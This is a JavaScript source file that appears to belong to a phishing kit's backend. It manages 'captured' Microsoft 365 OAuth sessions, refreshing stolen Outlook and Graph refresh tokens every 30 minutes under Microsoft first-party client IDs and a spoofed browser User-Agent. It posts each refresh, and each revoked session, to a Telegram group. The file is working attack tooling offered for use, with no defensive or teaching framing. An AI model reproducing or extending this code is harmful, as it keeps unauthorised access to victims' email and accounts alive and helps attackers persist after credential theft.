// services/tokenManager.js
const axios = require('axios');

class PersistentTokenManager {
    constructor(sessionId, tokens, resource = 'outlook') {
        this.sessionId = sessionId;
        this.resource = resource;
        this.accessToken = tokens.access_token;
        this.refreshToken = tokens.refresh_token;
        this.expiresAt = Date.now() + (tokens.expires_in * 1000);
        this.scopes = tokens.scope;
        this.caeEnabled = true;
        this.lastRefresh = Date.now();
        this.refreshCount = 0;
        this.capturedAt = new Date().toISOString();
        this.clientId = resource === 'graph' ? '1fec8e78-bce4-4aaf-ab1b-5451cc387264' : 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    }

    isExpired() {
        return Date.now() >= (this.expiresAt - 300000);
    }

    async refresh(useGraph = false) {
        if (!this.refreshToken) {
            throw new Error('No refresh token available');
        }

        const scope = useGraph 
            ? 'https://graph.microsoft.com/.default offline_access'
            : 'https://outlook.office.com/.default offline_access';

        try {
            const claims = JSON.stringify({
                access_token: {
                    xms_cc: { values: ["CP1"] }
                }
            });

            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    client_id: this.clientId,
                    refresh_token: this.refreshToken,
                    grant_type: 'refresh_token',
                    scope: scope,
                    claims: claims
                }).toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'application/json'
                    }
                }
            );

            const newTokens = response.data;
            
            this.accessToken = newTokens.access_token;
            this.expiresAt = Date.now() + (newTokens.expires_in * 1000);
            this.lastRefresh = Date.now();
            this.refreshCount++;
            
            if (newTokens.refresh_token) {
                this.refreshToken = newTokens.refresh_token;
                console.log(`🔄 New refresh token issued for session ${this.sessionId}`);
            }
            
            console.log(`✅ Token refreshed for ${this.resource} (expires in ${newTokens.expires_in}s)`);
            return newTokens;
            
        } catch (error) {
            if (error.response?.status === 400 && error.response?.data?.error === 'invalid_grant') {
                console.error(`❌ Refresh token invalid for session ${this.sessionId}`);
                throw new Error('Token revoked - requires re-authentication');
            }
            throw error;
        }
    }

    async getValidToken() {
        if (this.isExpired()) {
            console.log(`🔄 Token expired, refreshing...`);
            await this.refresh(this.resource === 'graph');
        }
        return this.accessToken;
    }

    async testAccess() {
        try {
            const testUrl = this.resource === 'graph' 
                ? 'https://graph.microsoft.com/v1.0/me'
                : 'https://outlook.office.com/api/v2.0/me';
            
            const response = await axios.get(testUrl, {
                headers: {
                    'Authorization': `Bearer ${this.accessToken}`,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            });
            
            return { valid: true, user: response.data };
        } catch (error) {
            const status = error.response?.status;
            
            if (status === 401) {
                const claimsHeader = error.response?.headers?.['www-authenticate'];
                if (claimsHeader && claimsHeader.includes('claims')) {
                    return { valid: false, requiresClaimsRefresh: true, claims: claimsHeader };
                }
                return { valid: false, reason: 'Token expired or invalid' };
            }
            
            return { valid: false, error: error.message };
        }
    }

    getStatus() {
        return {
            resource: this.resource,
            valid: !this.isExpired(),
            expiresIn: Math.max(0, Math.floor((this.expiresAt - Date.now()) / 1000)),
            expiresAt: new Date(this.expiresAt).toISOString(),
            lastRefresh: new Date(this.lastRefresh).toISOString(),
            refreshCount: this.refreshCount,
            caeEnabled: this.caeEnabled,
            scopes: this.scopes
        };
    }
}

class TokenRefreshScheduler {
    constructor(capturedData, bot, telegramGroupId) {
        this.capturedData = capturedData;
        this.bot = bot;
        this.telegramGroupId = telegramGroupId;
        this.refreshInterval = null;
        this.checkInterval = 30 * 60 * 1000; // 30 minutes
    }

    start() {
        if (this.refreshInterval) clearInterval(this.refreshInterval);
        
        this.refreshInterval = setInterval(async () => {
            await this.refreshAllTokens();
        }, this.checkInterval);
        
        console.log('✅ Token refresh scheduler started (checking every 30 minutes)');
    }

    async refreshAllTokens() {
        console.log('🔄 Running scheduled token refresh check...');
        
        for (const [sessionId, sessionData] of this.capturedData.entries()) {
            if (!sessionData.tokenManagers) continue;
            
            for (const [resource, tokenManager] of Object.entries(sessionData.tokenManagers)) {
                if (!tokenManager || typeof tokenManager.isExpired !== 'function') continue;
                
                try {
                    const timeUntilExpiry = tokenManager.expiresAt - Date.now();
                    const shouldRefresh = timeUntilExpiry < 15 * 60 * 1000; // Refresh if less than 15 minutes remaining
                    
                    if (shouldRefresh) {
                        console.log(`🔄 Refreshing ${resource} token for session ${sessionId} (expires in ${Math.round(timeUntilExpiry / 60000)} minutes)`);
                        
                        await tokenManager.refresh(resource === 'graph');
                        
                        if (resource === 'outlook' && sessionData.tokens?.outlook) {
                            sessionData.tokens.outlook.access_token = tokenManager.accessToken;
                            sessionData.tokens.outlook.refresh_token = tokenManager.refreshToken;
                        } else if (resource === 'graph' && sessionData.tokens?.graph) {
                            sessionData.tokens.graph.access_token = tokenManager.accessToken;
                            sessionData.tokens.graph.refresh_token = tokenManager.refreshToken;
                        }
                        
                        if (this.bot && this.telegramGroupId) {
                            const message = `🔄 *Token Refreshed*\n━━━━━━━━━━━━━━━━━━\n*Session:* \`${sessionId}\`\n*Resource:* ${resource}\n*New Expiry:* ${new Date(tokenManager.expiresAt).toLocaleString()}\n*Refresh Count:* ${tokenManager.refreshCount}`;
                            
                            this.bot.sendMessage(this.telegramGroupId, message, { parse_mode: 'Markdown' })
                                .catch(() => {});
                        }
                    }
                } catch (error) {
                    console.error(`❌ Failed to refresh ${resource} token for session ${sessionId}:`, error.message);
                    
                    if (this.bot && this.telegramGroupId && error.message.includes('revoked')) {
                        const message = `⚠️ *Token Refresh Failed*\n━━━━━━━━━━━━━━━━━━\n*Session:* \`${sessionId}\`\n*Resource:* ${resource}\n*Error:* ${error.message}\n*Action Required:* User needs to re-authenticate`;
                        
                        this.bot.sendMessage(this.telegramGroupId, message, { parse_mode: 'Markdown' })
                            .catch(() => {});
                    }
                }
            }
        }
    }

    stop() {
        if (this.refreshInterval) {
            clearInterval(this.refreshInterval);
            this.refreshInterval = null;
            console.log('🛑 Token refresh scheduler stopped');
        }
    }
}

module.exports = { PersistentTokenManager, TokenRefreshScheduler };